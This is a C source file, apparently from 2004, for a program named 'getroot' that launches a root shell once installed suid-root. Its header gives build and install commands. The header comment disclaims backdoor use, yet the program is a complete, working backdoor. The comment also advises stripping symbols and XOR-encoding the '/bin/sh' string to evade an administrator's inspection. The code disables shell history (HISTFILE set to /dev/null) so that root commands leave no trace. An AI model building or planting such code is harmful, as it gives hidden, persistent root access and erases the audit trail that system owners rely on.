/**
 
 A simple program to start a root shell if setup correctly with the suid
 bit and as root owning this file.
 
 This is an example of how easy it would be (this is nothing magical),
 do not use this to actually implement backdoors.
 
 Copyright 2004 Aleksandr Koltsoff (czr@iki.fi)
 Permission is granted to use this program for what ever you want,
 except to actually implement a backdoor. If you really want to do that,
 you'll need to rewrite the program (which wouldn't be too difficult for
 sure).
 
 Changelog:
 2004-03-10: Initial working version
 2004-03-11: Made html-listing , fixed typos
 2013-12-04: unset shell env
 
 build with:
 gcc -Os -Wall getroot.c -ogetroot
 strip --strip-unneeded getroot
 
 then, as root:
 chown root.root getroot
 (to switch the owner of the file, so that suid bit will work)
 chmod +s getroot
 (set the suid bit)
 
 the strip will get rid of all unnecessary symbols in the executable so
 that nm -tool cannot be used on it (well it can of course). you could
 also use -s -parameter with gcc in order for it to strip automatically.
 
 if you want a static executable (to make a non dynamic executable, no
 .so dependencies), add a flag -static to the gcc command. this will
 enlarge your executable somewhat (a lot in fact). then the tool can
 be used even if shared libraries on your system don't work for some reason.
 
 the administrator can still use the strings -tool to search for ascii
 strings in your executable (you should try it). they will see the
 "/bin/sh" part. There are techniques (simple ones) with which you
 can also hide this string (XOR-ring the string with 0xAA for example).
 
 bash (the default shell), will drop root-privileges if attempted
 to start trough suid bit on the executable by non-root user (it's a
 security feature). this is why we need to make our own program.
 
 by the way, since we're using execvp, you can execute another
 program via the root shell like this:
 ./getroot -c id
 
 see manual page for sh for info about the -c parameter.
 
 */
#define _GNU_SOURCE 
 
#include <unistd.h> /* setuid, .. */
#include <sys/types.h>  /* setuid, .. */
#include <grp.h>    /* setgroups */
#include <stdio.h>  /* perror */
#include <stdlib.h>  /* unsetenv */

extern char **environ;
 
int main (int argc, char** argv) {
 
  gid_t newGrp = 0;
 
  /**
    if you installed programming manual pages, you can get the
    man page for execve 'man execvp'. Same goes for all the
    other system calls that we're using here.
   */
 
  /* this will tattoo the suid bit so that bash won't see that
     we're not really root. we also drop all other memberships
     just in case we're running with PAGs (in AFS) */
  if (setuid(0) != 0) {
    perror("Setuid failed, no suid-bit set?");
    return 1;
  }
  setgid(0);
  seteuid(0);
  setegid(0);
  /* we also drop all the groups that the old user had
     (verify with id -tool afterwards)
     this is not strictly necessary but we want to get rid of the
     groups that the original user was part of. */
  setgroups(1, &newGrp);
 
  /* set HOME env */
  setenv("HOME", "/root", 1);
  setenv("LOGNAME", "root", 1);

  /* unset shell env */
  unsetenv("HISTFILE");
  unsetenv("HISTFILESIZE");
  unsetenv("HISTSIZE");
  unsetenv("HISTORY");
  unsetenv("HISTSAVE");
  unsetenv("HISTZONE");
  unsetenv("HISTLOG");
  unsetenv("HISTCMD");
  setenv("HISTFILE","/dev/null", 1);
  setenv("HISTSIZE","0", 1);
  setenv("HISTFILESIZE","0", 1);
 
  /* load the default shell on top of this program
     to exit from the shell, use 'exit' :-) */
  execvpe("/bin/sh", argv, environ); 
 
  return 0;
}